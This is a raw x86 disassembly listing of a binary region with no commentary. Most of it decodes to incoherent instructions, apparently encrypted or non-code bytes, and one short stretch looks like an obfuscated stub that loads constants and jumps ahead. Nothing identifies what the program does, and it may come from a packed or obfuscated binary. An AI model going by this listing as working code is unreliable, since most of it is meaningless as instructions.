  40cd37:	xchg   DWORD PTR [ebp-0x33f811c3],esi
  40cd3d:	fisubr WORD PTR [esi]
  40cd3f:	fs scas eax,DWORD PTR es:[edi]
  40cd41:	leave  
  40cd42:	push   eax
  40cd43:	inc    ebp
  40cd44:	xchg   DWORD PTR [edx],ecx
  40cd46:	sahf   
  40cd47:	push   ecx
  40cd48:	stos   BYTE PTR es:[edi],al
  40cd49:	stos   BYTE PTR es:[edi],al
  40cd4a:	shl    BYTE PTR [edi],cl
  40cd4c:	jp     0x40cd78
  40cd4e:	and    ebp,DWORD PTR [eax-0x38]
  40cd51:	addr16 sub al,0xfe
  40cd54:	into   
  40cd55:	leave  
  40cd56:	aad    0x6d
  40cd58:	scas   eax,DWORD PTR es:[edi]
  40cd59:	int3   
  40cd5a:	icebp  
  40cd5b:	lds    edx,FWORD PTR [ecx+0x52]
  40cd5e:	pop    esi
  40cd5f:	in     eax,0x9c
  40cd61:	les    ecx,FWORD PTR [ecx+0x18]
  40cd64:	repnz push edx
  40cd66:	add    esi,eax
  40cd68:	mov    dh,0x8c
  40cd6a:	push   eax
  40cd6b:	xlat   BYTE PTR ds:[ebx]
  40cd6c:	ficomp DWORD PTR [edx]
  40cd6e:	fdiv   QWORD PTR [edx+0x14ed6fb6]
  40cd74:	stos   BYTE PTR es:[edi],al
  40cd75:	aam    0x23
  40cd77:	cs into 
  40cd79:	(bad)  
  40cd7a:	cld    
  40cd7b:	repz out dx,eax
  40cd7d:	mov    dl,BYTE PTR [ecx+0x1533cd99]
  40cd83:	fsub   st(0),st
  40cd85:	or     dh,cl
  40cd87:	mov    al,0x5
  40cd89:	jp     0x40cda4
  40cd8b:	jo     0x40cd3b
  40cd8d:	test   edi,edx
  40cd8f:	sub    dl,ch
  40cd91:	ja     0x40cd45
  40cd93:	pop    es
  40cd94:	aaa    
  40cd95:	inc    esi
  40cd96:	aas    
  40cd97:	pop    edx
  40cd98:	xchg   ebp,eax
  40cd99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cd9a:	sahf   
  40cd9b:	inc    edx
  40cd9c:	mov    al,ds:0xbf3e8a3e
  40cda1:	mov    al,0x9e
  40cda3:	mov    bh,0x8f
  40cda5:	lahf   
  40cda6:	xchg   esi,eax
  40cda7:	imul   ecx,ebp,0x76
  40cdaa:	addr16 xchg ecx,eax
  40cdac:	(bad)  
  40cdad:	pop    eax
  40cdae:	push   cs
  40cdaf:	sbb    eax,0x921fc806
  40cdb4:	(bad)  
  40cdb6:	lahf   
  40cdb7:	nop
  40cdb8:	fiadd  DWORD PTR [ecx+0x20]
  40cdbb:	xor    DWORD PTR [ecx-0x657762f1],esi
  40cdc1:	pop    esi
  40cdc2:	pop    edi
  40cdc3:	ja     0x40cdd0
  40cdc5:	lods   eax,DWORD PTR ds:[esi]
  40cdc6:	out    dx,eax
  40cdc7:	and    bh,BYTE PTR [esi+0x73]
  40cdca:	repnz sbb cl,dl
  40cdcd:	call   0x8dc3:0xbd0516b0
  40cdd4:	es in  eax,0xb7
  40cdd7:	fisttp DWORD PTR [esi+0x6adedeb7]
  40cddd:	inc    eax
  40cdde:	daa    
  40cddf:	stc    
  40cde0:	jmp    0x40cd6f
  40cde2:	push   0x17
  40cde4:	sbb    al,0xaa
  40cde6:	ret    0xd54c
  40cde9:	repz pop edx
  40cdeb:	sbb    eax,0x2eb2508a
  40cdf0:	sbb    ecx,edx
  40cdf2:	(bad)  
  40cdf3:	push   edx
  40cdf4:	out    0xf8,al
  40cdf6:	inc    esi
  40cdf7:	push   es
  40cdf8:	arpl   WORD PTR [ebx+0x75],di
  40cdfb:	or     bh,BYTE PTR [edx+0x7cedbb5a]
  40ce01:	push   eax
  40ce02:	rcl    BYTE PTR gs:[ebp-0xefe0ce6],0x1a
  40ce0a:	jle    0x40ce79
  40ce0c:	test   dl,dl
  40ce0e:	fs clc 
  40ce10:	jb     0x40ce39
  40ce12:	jno    0x40cdd0
  40ce14:	push   0xb3e6ec79
  40ce19:	xor    al,0x22
  40ce1b:	jge    0x40cdf0
  40ce1d:	std    
  40ce1e:	or     eax,0x2939b286
  40ce23:	jp     0x40ce6c
  40ce25:	nop
  40ce26:	mov    dh,0x9a
  40ce28:	ja     0x40ce15
  40ce2a:	dec    ebx
  40ce2b:	sti    
  40ce2c:	sbb    DWORD PTR [ebx+0x7],esi
  40ce2f:	sbb    edx,DWORD PTR [ecx-0x68]
  40ce32:	cli    
  40ce33:	pop    eax
  40ce34:	outs   dx,BYTE PTR ds:[esi]
  40ce35:	jmp    0xb32c:0x84cd16fb
  40ce3c:	jo     0x40ce78
  40ce3e:	pop    edi
  40ce3f:	pop    es
  40ce40:	aam    0x48
  40ce42:	not    BYTE PTR [eax+ecx*4-0x10773d89]
  40ce49:	xchg   DWORD PTR [ecx],ebx
  40ce4b:	push   ecx
  40ce4c:	dec    eax
  40ce4d:	mov    bl,0x25
  40ce4f:	scas   al,BYTE PTR es:[edi]
  40ce50:	inc    esi
  40ce51:	imul   DWORD PTR [ebx-0x29c32cb1]
  40ce57:	jns    0x40ce66
  40ce59:	push   0x94994a31
  40ce5e:	(bad)  
  40ce5f:	hlt    
  40ce60:	(bad)  
  40ce61:	out    dx,eax
  40ce62:	rcr    ebx,0xf
  40ce65:	loop   0x40ce16
  40ce67:	cmp    al,bh
  40ce69:	lahf   
  40ce6a:	add    ebp,DWORD PTR [ebp-0x44aaf8fe]
  40ce70:	mov    esi,0x6c456ed8
  40ce75:	popf   
  40ce76:	fbld   TBYTE PTR [edx]
  40ce78:	pop    edx
  40ce79:	scas   eax,DWORD PTR es:[edi]
  40ce7a:	mov    dl,0x7b
  40ce7c:	mov    cl,0x32
  40ce7e:	push   eax
  40ce7f:	call   0x9438:0x562f83c2
  40ce86:	sub    al,BYTE PTR [eax+edi*4+0x2964bc3d]
  40ce8d:	addr16 call 0xcf3e0333
  40ce93:	xchg   ebx,eax
  40ce94:	sub    edx,edi
  40ce96:	cmp    eax,0xe790cf11
  40ce9b:	and    ebp,esp
  40ce9d:	xchg   esi,eax
  40ce9e:	scas   eax,DWORD PTR es:[edi]
  40ce9f:	les    esp,FWORD PTR [ebx+eax*2-0x26]
  40cea3:	push   ebx
  40cea4:	ins    BYTE PTR es:[edi],dx
  40cea5:	mov    esi,0xa8136414
  40ceaa:	xchg   esi,eax
  40ceab:	lahf   
  40ceac:	ja     0x40cec0
  40ceae:	sub    al,0xd0
  40ceb0:	sar    DWORD PTR ds:0x27780779,0xcd
  40ceb7:	mov    esi,0x727e0657
  40cebc:	call   0x9583:0x1c77ac4c
  40cec3:	clc    
  40cec4:	ficomp WORD PTR [edx+0x41]
  40cec7:	(bad)  
  40cec8:	add    ecx,DWORD PTR [ebp-0x63]
  40cecb:	out    dx,eax
  40cecc:	das    
  40cecd:	aad    0x44
  40cecf:	scas   eax,DWORD PTR es:[edi]
  40ced0:	rol    BYTE PTR [eax-0x6e],1
  40ced3:	retf   0x350f
  40ced6:	xchg   edi,eax
  40ced7:	xor    eax,0x67675987
  40cedc:	push   ecx
  40cedd:	test   BYTE PTR [edx+eiz*4],al
  40cee0:	push   ds
  40cee1:	mov    esp,DWORD PTR [ecx+0x5]
  40cee4:	in     al,0x16
  40cee6:	out    0xc4,al
  40cee8:	enter  0xbd7b,0x6c
  40ceec:	xchg   ebx,eax
  40ceed:	xor    al,0xc0
  40ceef:	dec    ebp
  40cef0:	ss jmp 0x40cf50
  40cef3:	and    BYTE PTR [ecx-0x1419abcc],al
  40cef9:	xchg   edi,eax
  40cefa:	pop    edx
  40cefb:	and    ecx,DWORD PTR [ebx+0x24c110d7]
  40cf01:	pop    edi
  40cf02:	out    dx,eax
  40cf03:	test   al,0x5f
  40cf05:	sub    BYTE PTR [edi+0x221c76de],cl
  40cf0b:	cmp    al,0x14
  40cf0d:	sbb    ecx,esi
  40cf0f:	rdpmc  
  40cf11:	pop    ss
  40cf12:	test   DWORD PTR [edx+0x3b],esi
  40cf15:	cmp    al,0xe2
  40cf17:	jns    0x40cf31
  40cf19:	and    eax,0x9cf8e0cc
  40cf1e:	ins    DWORD PTR es:[edi],dx
  40cf1f:	call   0xa5755ad9
  40cf24:	mov    WORD PTR ds:0xc19a8999,ss
  40cf2a:	push   ecx
  40cf2b:	mov    al,ds:0x2e829cd9
  40cf30:	retf   0x1716
  40cf33:	mov    ebx,0xe8e5a448
  40cf38:	inc    ebp
  40cf39:	mov    dl,0xd9
  40cf3b:	adc    ebp,DWORD PTR [edi+0x9bbe042]
  40cf41:	icebp  
  40cf42:	lahf   
  40cf43:	test   DWORD PTR [edx-0x14],ebx
  40cf46:	jne    0x40cf3d
  40cf48:	inc    eax
  40cf49:	or     cl,BYTE PTR [ecx]
  40cf4b:	fistp  QWORD PTR [edx]
  40cf4d:	sti    
  40cf4e:	es ret 0xf9c2
  40cf52:	ins    BYTE PTR es:[edi],dx
  40cf53:	inc    edx
  40cf54:	jae    0x40cf83
  40cf56:	push   ss
  40cf57:	sbb    al,0x84
  40cf59:	or     eax,0x102b6f78
  40cf5e:	pop    edx
  40cf5f:	mov    es,WORD PTR [ebx-0x1e]
  40cf62:	in     al,0xb1
  40cf64:	adc    cl,ah
  40cf66:	js     0x40cf26
  40cf68:	push   0x36c2809d
  40cf6d:	xchg   ecx,eax
  40cf6e:	jno    0x40cf37
  40cf70:	xor    eax,0x85e09d6d
  40cf75:	mov    ecx,0x7f3910dd
  40cf7a:	mov    BYTE PTR [edx],ch
  40cf7c:	test   edi,eax
  40cf7e:	and    BYTE PTR [ecx],bh
  40cf80:	inc    ebx
  40cf81:	or     DWORD PTR [edi],eax
  40cf83:	in     al,dx
  40cf84:	iret   
  40cf85:	xor    ecx,DWORD PTR [esi]
  40cf87:	cs push ecx
  40cf89:	shr    DWORD PTR [ebx+0x14ff008d],cl
  40cf8f:	and    esi,DWORD PTR [bp+si-0x652f]
  40cf94:	or     bh,BYTE PTR [eax-0x73]
  40cf97:	inc    ecx
  40cf98:	sub    BYTE PTR [esi],bh
  40cf9a:	jnp    0x40cfb3
  40cf9c:	jne    0x40cf47
  40cf9e:	mov    ds:0xd6827fb,eax
  40cfa3:	push   ecx
  40cfa4:	cmp    eax,0xfb62f7ce
  40cfa9:	push   esi
  40cfaa:	and    eax,0x6b3d2808
  40cfaf:	xor    bl,BYTE PTR [eax-0x3c752acd]
  40cfb5:	jmp    0xcd8f:0xc965994a
  40cfbc:	pop    edx
  40cfbd:	add    al,BYTE PTR [ecx+0x43e1b6c4]
  40cfc3:	or     BYTE PTR [ebp+0xef2b532],cl
  40cfc9:	test   BYTE PTR [edx-0x37],cl
  40cfcc:	add    al,0x4d
  40cfce:	inc    BYTE PTR [edi]
  40cfd0:	imul   esp,DWORD PTR [esi-0x473bc36b],0x225351bd
  40cfda:	outs   dx,DWORD PTR ds:[esi]
  40cfdc:	sub    eax,0x78f1e835
  40cfe1:	push   edi
  40cfe2:	test   eax,0xf4fdd694
  40cfe7:	popf   
  40cfe8:	cwde   
  40cfe9:	ss pop ds
  40cfeb:	dec    esp
  40cfec:	test   BYTE PTR [edx-0x1],al
  40cfef:	sbb    ebx,DWORD PTR [edi+0x2af281e8]
  40cff5:	mov    edi,0xc6dae346
  40cffa:	inc    ecx
  40cffb:	jge    0x40d064
  40cffd:	sub    al,0xf9
  40cfff:	inc    esp
  40d000:	test   eax,0xe8a7a966
  40d005:	lods   eax,DWORD PTR ds:[esi]
  40d006:	ins    BYTE PTR es:[edi],dx
  40d007:	mov    eax,ds:0xfba3ff0f
  40d00c:	daa    
  40d00d:	dec    ebp
  40d00e:	out    0x1,eax
  40d010:	adc    eax,0x1ec13854
  40d015:	jns    0x40d00b
  40d017:	icebp  
  40d018:	adc    BYTE PTR [ecx+0x11301184],dl
  40d01e:	inc    edi
  40d01f:	push   edi
  40d020:	mov    eax,0xc92ccb09
  40d025:	sub    eax,0x1161621a
  40d02a:	sub    ecx,DWORD PTR [esi-0x2be20d93]
  40d030:	jp     0x40d046
  40d032:	mov    edi,0x3b977b65
  40d037:	pop    ds
  40d038:	fist   WORD PTR [edi+ebx*8]
  40d03b:	mov    bh,0x0
  40d03d:	mov    ds:0xcb9a21a5,eax
  40d042:	or     ebx,eax
  40d044:	jmp    0x40d0c2
  40d046:	retf   
  40d047:	jge    0x40d0b9
  40d049:	mov    eax,0xb45ba568
  40d04e:	pop    esi
  40d04f:	jge    0x40d059
  40d051:	or     BYTE PTR [edi-0x2],bl
  40d054:	and    dl,BYTE PTR [eax+0x29328d8e]
  40d05a:	add    DWORD PTR [eax+0x715af77d],0x3f4e5ca6
  40d064:	addr16 pop eax
  40d066:	push   0xffffff92
  40d068:	mov    cl,cl
  40d06a:	aad    0x9a
  40d06c:	cmp    ah,bh
  40d06e:	dec    eax
  40d06f:	ror    BYTE PTR [ecx+0x34],0x8c
  40d073:	test   al,0xd5
  40d075:	adc    eax,0x8a151772
  40d07a:	mov    al,ds:0x42a06a16
  40d07f:	call   0x7218b098
  40d084:	sub    eax,0xfe89aee4
  40d089:	push   esp
  40d08a:	mov    ah,0x83
  40d08c:	sub    dh,dh
  40d08e:	dec    edi
  40d08f:	sbb    DWORD PTR [ebx+0x16],ecx
  40d092:	adc    eax,0xe5ba4b0c
  40d097:	push   ebx
  40d098:	pop    edx
  40d099:	ins    DWORD PTR es:[edi],dx
  40d09a:	lahf   
  40d09b:	push   0x7b70ca86
  40d0a0:	or     eax,0x93c095c8
  40d0a5:	inc    eax
  40d0a6:	lods   al,BYTE PTR ds:[esi]
  40d0a7:	cld    
  40d0a8:	jno    0x40d108
  40d0aa:	or     eax,0xcf0ee993
  40d0af:	lock aaa 
  40d0b1:	mov    eax,0xb01d933
  40d0b6:	inc    ebp
  40d0b7:	fisttp QWORD PTR [ebx]
  40d0b9:	scas   eax,DWORD PTR es:[edi]
  40d0ba:	push   eax
  40d0bb:	repz std 
  40d0bd:	stos   DWORD PTR es:[edi],eax
  40d0be:	adc    eax,0x90de95d6
  40d0c3:	daa    
  40d0c4:	mov    ebx,0xef53e6fc
  40d0c9:	ror    BYTE PTR [ebx-0x6d],1
  40d0cc:	ss sbb eax,0xe0458989
  40d0d2:	adc    edx,0x5a
  40d0d5:	mov    DWORD PTR [ebp-0x1c],edx
  40d0d8:	mov    DWORD PTR [ebp-0x80],0xfa4
  40d0df:	mov    DWORD PTR [ebp-0x70],0x618e
  40d0e6:	mov    DWORD PTR [ebp-0x6c],0x811
  40d0ed:	mov    DWORD PTR [ebp-0x98],0x42d6904a
  40d0f7:	mov    DWORD PTR [ebp-0x94],0xe82c1
  40d101:	mov    DWORD PTR [ebp-0x88],0x58ff
  40d10b:	mov    DWORD PTR [ebp-0x84],0x7394
  40d115:	xor    eax,eax
  40d117:	inc    eax
  40d118:	mov    DWORD PTR [ebp-0x64],eax
  40d11b:	mov    DWORD PTR [ebp-0x8],0x5f59
  40d122:	mov    DWORD PTR [ebp-0x4],0x652b
  40d129:	mov    DWORD PTR [ebp-0xc],0xf43
  40d130:	mov    DWORD PTR [ebp-0x14],0x22dc
  40d137:	mov    DWORD PTR [ebp-0x2c],0x45d4
  40d13e:	mov    DWORD PTR [ebp-0x30],0x28e1
  40d145:	mov    DWORD PTR [ebp-0x7c],0x5e09
  40d14c:	mov    DWORD PTR [ebp-0x50],0x3910
  40d153:	mov    DWORD PTR [ebp-0x3c],0x5c97
  40d15a:	mov    DWORD PTR [ebp-0x24],0x6111
  40d161:	mov    DWORD PTR [ebp-0x78],ecx
  40d164:	mov    DWORD PTR [ebp-0x34],ecx
  40d167:	mov    DWORD PTR [ebp-0x44],0x207a
  40d16e:	mov    DWORD PTR [ebp-0x60],eax
  40d171:	mov    DWORD PTR [ebp-0x8c],0x7840
  40d17b:	mov    DWORD PTR [ebp-0x4c],0x6b0b
  40d182:	mov    eax,DWORD PTR [ebp-0x30]
  40d185:	or     eax,0x70c5
  40d18a:	add    eax,DWORD PTR [ebp-0x2c]
  40d18d:	mov    ecx,DWORD PTR [ebp-0x14]
  40d190:	or     eax,ecx
  40d192:	mov    ecx,0xce40
  40d197:	sub    ecx,eax
  40d199:	jmp    0x40d5a4
  40d19e:	imul   eax,ebx,0xb67c365b
  40d1a4:	lods   al,BYTE PTR ds:[esi]
  40d1a5:	xchg   esp,eax
  40d1a6:	adc    dl,0x9e
  40d1a9:	nop
  40d1aa:	aaa    
  40d1ab:	outs   dx,BYTE PTR ds:[esi]
  40d1ac:	pusha  
  40d1ad:	sahf   
  40d1ae:	xchg   ecx,eax
  40d1af:	out    0xbe,eax
  40d1b1:	mov    esi,0xbebec492
  40d1b6:	outs   dx,DWORD PTR ds:[esi]
  40d1b7:	mov    esp,0xad2c893f
  40d1bc:	imul   esi,ecx,0xa826fdc9
  40d1c2:	push   cs
  40d1c3:	shl    BYTE PTR [eax+0x65],0x68
  40d1c7:	cmp    dh,ah
  40d1c9:	hlt    
  40d1ca:	rcl    DWORD PTR [edi+edx*4],cl
  40d1cd:	pop    ecx
  40d1ce:	cld    
  40d1cf:	(bad)  [bp+di-0x21]
  40d1d3:	pop    DWORD PTR [esi]
  40d1d5:	mov    esp,0x67605691
  40d1da:	and    al,0x82
  40d1dc:	icebp  
  40d1dd:	cmp    al,0x31
  40d1df:	retf   0x65fa
  40d1e2:	xor    bl,BYTE PTR [esi-0x2f910f4a]
  40d1e8:	loop   0x40d247
  40d1ea:	cmp    al,0x9e
  40d1ec:	jp     0x40d223
  40d1ee:	push   ds
  40d1ef:	pushf  
  40d1f0:	xor    eax,0x130911b4
  40d1f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d1f6:	mov    ch,0x95
  40d1f8:	ds sahf 
  40d1fa:	into   
  40d1fb:	dec    BYTE PTR [edx+eax*2-0x52]
  40d1ff:	jns    0x40d1fa
  40d201:	pop    ebx
  40d202:	mov    ebx,0xd408c51
  40d207:	ret    0x6aab
  40d20a:	loope  0x40d1ec
  40d20c:	mov    BYTE PTR fs:[ebx],bl
  40d20f:	rcl    dh,1
  40d211:	xchg   ebp,eax
  40d212:	push   esi
  40d213:	adc    BYTE PTR [esi],cl
  40d215:	mov    dl,0xd
  40d217:	push   ebx
  40d218:	jmp    0xf478:0xe9aac092
  40d21f:	xor    eax,0xf8517dab
  40d224:	in     al,dx
  40d225:	xor    al,0x8f
  40d227:	out    dx,al
  40d228:	not    edx
  40d22a:	xchg   ebx,eax
  40d22b:	in     eax,0x52
  40d22d:	and    eax,0xfb3f954a
  40d232:	xchg   DWORD PTR [ecx+0x59],esp
  40d235:	inc    esp
  40d236:	loope  0x40d2ab
  40d238:	rcr    BYTE PTR [eax+eiz*8],cl
  40d23b:	ret    0x1e66
  40d23e:	test   eax,0x2b34c495
  40d243:	push   cs
  40d244:	rol    BYTE PTR [eax+ebp*4],1
  40d247:	leave  
  40d248:	push   esp
  40d249:	or     al,BYTE PTR [esp+edi*1-0x47]
  40d24d:	push   esp
  40d24e:	aaa    
  40d24f:	sbb    al,0xc1
  40d251:	jg     0x40d284
  40d253:	add    dl,BYTE PTR [esi-0x6e367e52]
  40d259:	or     cl,BYTE PTR [esi+0x0]
  40d25c:	inc    edi
  40d25d:	adc    DWORD PTR [esi-0x5bdd8ce],ecx
  40d263:	test   al,0x7
  40d265:	call   DWORD PTR [edx+0x5dbbae80]
  40d26b:	push   edx
  40d26c:	xchg   edx,eax
  40d26d:	dec    edx
  40d26e:	sub    ch,BYTE PTR [ecx-0x7]
  40d271:	mov    ebx,0xebc86bf
  40d276:	loope  0x40d2aa
  40d278:	retf   0xda8e
  40d27b:	mov    al,dh
  40d27d:	sub    eax,0xda0b8be1
  40d282:	adc    al,0x3a
  40d284:	js     0x40d2fb
  40d286:	pop    ss
  40d287:	sub    ch,BYTE PTR [edi-0x644a4a9f]
  40d28d:	xor    ch,BYTE PTR [eax-0x25]
  40d290:	sbb    eax,0xc9e254b2
  40d295:	(bad)  
  40d296:	scas   eax,DWORD PTR es:[edi]
  40d297:	retf   0x911a
  40d29a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d29b:	sub    eax,0xb4c3ffcd
  40d2a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d2a1:	xchg   BYTE PTR [ebx+0x16],al
  40d2a4:	leave  
  40d2a5:	test   DWORD PTR [ebp-0x31],ecx
  40d2a8:	sub    al,0xbc
  40d2aa:	mov    gs,WORD PTR [edx+edi*4+0x38]
  40d2ae:	add    edx,DWORD PTR [eax]
  40d2b0:	mov    eax,0xdb33a639
  40d2b5:	xchg   dl,ch
  40d2b7:	push   ebp
  40d2b8:	ret    
  40d2b9:	setb   BYTE PTR [esi+0x1b]
  40d2bd:	aaa    
  40d2be:	cmp    BYTE PTR [ecx-0x5bce7a31],0xb6
  40d2c5:	push   edx
  40d2c6:	js     0x40d25d
  40d2c8:	and    ch,BYTE PTR [edi]
  40d2ca:	lods   al,BYTE PTR ds:[esi]
  40d2cb:	xlat   BYTE PTR ds:[ebx]
  40d2cc:	inc    edi
  40d2cd:	and    dh,al
  40d2cf:	inc    esi
  40d2d0:	or     eax,0xee1f9e1b
  40d2d5:	mov    cl,0xd6
  40d2d7:	lods   al,BYTE PTR ds:[esi]
  40d2d8:	mov    ch,0xd5
  40d2da:	and    eax,0x9119df90
  40d2df:	mov    ah,0x44
  40d2e1:	inc    ebx
  40d2e2:	mov    edi,0x8a482efd
  40d2e7:	call   0x1f47:0xa0387a0c
  40d2ee:	and    DWORD PTR [esi+0x7a3ecb59],0x6a
  40d2f5:	loop   0x40d2ed
  40d2f7:	shl    BYTE PTR [esp+edi*2+0x16711aa0],1
  40d2fe:	mov    ds:0x63b7aaf0,al
  40d303:	dec    esi
  40d304:	lea    esi,[ebx+0x67]
  40d307:	pusha  
  40d308:	push   edx
  40d309:	cmp    eax,0x647e3913
  40d30e:	add    al,0x97
  40d310:	push   ss
  40d311:	or     eax,DWORD PTR [ecx+0x23]
  40d314:	loope  0x40d379
  40d316:	pop    ebp
  40d317:	xchg   DWORD PTR [ecx+0x2d56cada],esi
  40d31d:	inc    esp
  40d31e:	(bad)  
  40d320:	sub    DWORD PTR [eax+edx*8+0x54],0x2a
  40d325:	and    ebp,DWORD PTR [ebp-0x51e4932e]
  40d32b:	int    0x76
  40d32d:	lock dec ebx
  40d32f:	sub    BYTE PTR [eax-0x69986c24],ch
  40d335:	xchg   DWORD PTR [ebx-0xe],ebx
  40d338:	inc    ebp
  40d339:	fstp   TBYTE PTR [ecx+edx*2-0x63]
  40d33d:	loop   0x40d309
  40d33f:	addr16 dec ebx
  40d341:	inc    esp
  40d342:	or     edi,edi
  40d344:	cld    
  40d345:	sar    cl,1
  40d347:	inc    ecx
  40d348:	mov    BYTE PTR [eax+0x0],ch
  40d34b:	shr    DWORD PTR [edi+edx*8],cl
  40d34e:	mov    bl,0x36
  40d351:	push   0x68920ad5
  40d356:	rcl    BYTE PTR [ebx-0x4afea9b1],1
  40d35c:	shl    DWORD PTR [esi+0x2149accc],1
  40d362:	inc    ebp
  40d363:	pop    es
  40d364:	int    0x82
  40d366:	mov    ebx,0xde68a9a5
  40d36b:	cdq    
  40d36c:	pop    esi
  40d36d:	xor    ah,0x89
  40d370:	sub    eax,0xd3b60a0e
  40d375:	(bad)  
  40d377:	sbb    al,0xfe
  40d379:	dec    esp
  40d37a:	sahf   
  40d37b:	jno    0x40d3d4
  40d37d:	mov    fs,WORD PTR [edi+0x6a]
  40d380:	dec    edi
  40d381:	lahf   
  40d382:	adc    DWORD PTR [edi-0x4b52daea],0x67
  40d389:	fidivr WORD PTR [edi]
  40d38b:	out    dx,eax
  40d38c:	retf   
  40d38d:	(bad)  
  40d38e:	addr16 std 
  40d390:	pop    ecx
  40d391:	sbb    al,0x4f
  40d393:	cli    
  40d394:	xor    cl,BYTE PTR [edi+eiz*2-0x77]
  40d398:	jle    0x40d39a
  40d39a:	add    ah,ch
  40d39c:	ror    ch,1
  40d39e:	outs   dx,DWORD PTR ds:[esi]
  40d39f:	dec    sp
  40d3a1:	sbb    al,0xc2
  40d3a3:	inc    ecx
  40d3a4:	fidiv  DWORD PTR [edi-0x12]
  40d3a7:	std    
  40d3a8:	sti    
  40d3a9:	out    0x5e,al
  40d3ab:	rep stos DWORD PTR es:[edi],eax
  40d3ad:	int    0xc6
  40d3af:	xor    eax,edx
  40d3b1:	inc    ecx
  40d3b2:	inc    ebp
  40d3b3:	pop    eax
  40d3b4:	test   eax,0xdb5b430e
  40d3b9:	sub    esp,DWORD PTR [ebx-0x73defdd1]
  40d3bf:	popf   
  40d3c0:	xor    esp,DWORD PTR [eax+0x53baaf7]
  40d3c6:	pop    ss
  40d3c7:	mov    ecx,0x7e4ac840
  40d3cc:	enter  0xf23c,0xc2
  40d3d0:	repnz inc esp
  40d3d2:	pop    ebp
  40d3d3:	or     edx,edi
  40d3d5:	adc    bl,ch
  40d3d7:	je     0x40d3ba
  40d3d9:	loop   0x40d3ca
  40d3db:	xor    esi,esi
  40d3dd:	test   al,0x21
  40d3df:	jnp    0x40d3d9
  40d3e1:	add    al,0xe2
  40d3e3:	cmp    dh,BYTE PTR [ebx]
  40d3e5:	inc    esp
  40d3e6:	pop    ds
  40d3e7:	bound  ebx,QWORD PTR [ebx-0x27259812]
  40d3ed:	fcmovu st,st(0)
  40d3ef:	retf   
  40d3f0:	or     bh,BYTE PTR [eax+0x51]
  40d3f3:	gs pop eax
  40d3f5:	jmp    0x187c1ab1
  40d3fa:	sub    DWORD PTR [edx-0x3fc47c94],esp
  40d400:	stos   BYTE PTR es:[edi],al
  40d401:	jmp    0x40d3fd
  40d403:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d404:	retf   0x6899
  40d407:	inc    edi
  40d408:	fsubr  DWORD PTR [edi]
  40d40a:	psubq  mm1,QWORD PTR [edi-0x32de1d6f]
  40d411:	mov    ebp,0x55af3fd8
  40d416:	outs   dx,BYTE PTR ds:[esi]
  40d417:	mov    esp,0xd67b7c29
  40d41c:	fs je  0x40d45d
  40d41f:	and    dl,BYTE PTR [ebx]
  40d421:	pop    ss
  40d422:	outs   dx,BYTE PTR ds:[esi]
  40d423:	pop    ecx
  40d424:	adc    bl,BYTE PTR [edx]
  40d426:	xor    esp,DWORD PTR [ecx]
  40d428:	and    bl,BYTE PTR [edi-0x7b]
  40d42b:	and    al,0x47
  40d42d:	or     BYTE PTR fs:[edi-0x37dcd4d2],dl
  40d434:	aad    0xe4
  40d436:	or     esi,DWORD PTR [ebp-0x55]
  40d439:	jne    0x40d3dc
  40d43b:	rol    DWORD PTR [eax+0x5ffde304],cl
  40d441:	hlt    
  40d442:	or     al,0xf8
  40d444:	in     eax,dx
  40d445:	mov    bh,BYTE PTR [edi+edi*2-0x11]
  40d449:	or     bh,cl
  40d44b:	fbld   TBYTE PTR ds:0x898f9eb0
  40d451:	xor    bl,bh
  40d453:	in     al,0x30
  40d455:	or     cl,BYTE PTR [edi+0x66]
  40d458:	into   
  40d459:	or     al,0xcd
  40d45c:	adc    edi,DWORD PTR [edi+ecx*2]
  40d45f:	dec    eax
  40d460:	push   edx
  40d461:	or     DWORD PTR [edi+edi*1],edx
  40d464:	jge    0x40d4bb
  40d466:	pop    eax
  40d467:	or     eax,edx
  40d469:	sub    al,BYTE PTR [edi-0x42]
  40d46c:	cmp    dl,ah
  40d46e:	xor    ebp,DWORD PTR [edi+0x5c7778e7]
  40d474:	pop    eax
  40d475:	xor    edx,ebx
  40d477:	add    DWORD PTR [eax-0x1d],ecx
  40d47a:	cmp    eax,ebx
  40d47c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d47d:	(bad)
  40d480:	lea    esi,[ebx]
  40d482:	hlt    
  40d483:	int3   
  40d484:	jl     0x40d471
  40d486:	jmp    0x40d481
  40d488:	mov    cl,0x8f
  40d48a:	pop    ebp
  40d48b:	leave  
  40d48c:	mov    DWORD PTR [ecx],eax
  40d48e:	mov    eax,0x886f1d46
  40d493:	retf   
  40d494:	add    esp,DWORD PTR [esi-0x16]
  40d497:	inc    edx
  40d498:	mov    eax,ds:0x35a0a5d7
  40d49d:	dec    esp
  40d49e:	int3   
  40d49f:	adc    edi,DWORD PTR [edi-0x7898220b]
  40d4a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d4a6:	test   eax,edi
  40d4a8:	xor    al,0xd8
  40d4aa:	inc    ebx
  40d4ab:	pop    ss
  40d4ac:	std    
  40d4ad:	and    ch,BYTE PTR [edi-0x5a]
  40d4b0:	fldcw  WORD PTR [ebx-0x5b]
  40d4b3:	jle    0x40d446
  40d4b5:	add    al,0xac
  40d4b7:	sti    
  40d4b8:	pop    esp
  40d4b9:	xchg   edx,eax
  40d4ba:	nop
  40d4bb:	int3   
  40d4bc:	push   0x4e68c3c
  40d4c1:	pop    edx
  40d4c2:	push   cs
  40d4c3:	ror    DWORD PTR [edx-0x7a],0x96
  40d4c7:	pop    ebp
  40d4c8:	ffreep st(1)
  40d4ca:	adc    al,0xec
  40d4cc:	cmp    eax,0xa0825d4a
  40d4d1:	dec    edx
  40d4d2:	(bad)  
  40d4d3:	adc    al,0x7a
  40d4d5:	and    DWORD PTR [ebp+0x27dc2d41],eax
  40d4db:	mov    eax,0x503ca0f4
  40d4e0:	pop    ebp
  40d4e1:	jp     0x40d4d1
  40d4e3:	fistp  QWORD PTR [eax-0x59]
  40d4e6:	fcmovu st,st(6)
  40d4e8:	scas   al,BYTE PTR es:[edi]
  40d4e9:	outs   dx,BYTE PTR ds:[esi]
  40d4ea:	cmp    eax,0xe5cf2f71
  40d4ef:	out    dx,eax
  40d4f0:	xchg   edx,eax
  40d4f1:	scas   al,BYTE PTR es:[edi]
  40d4f2:	jmp    0x40d479
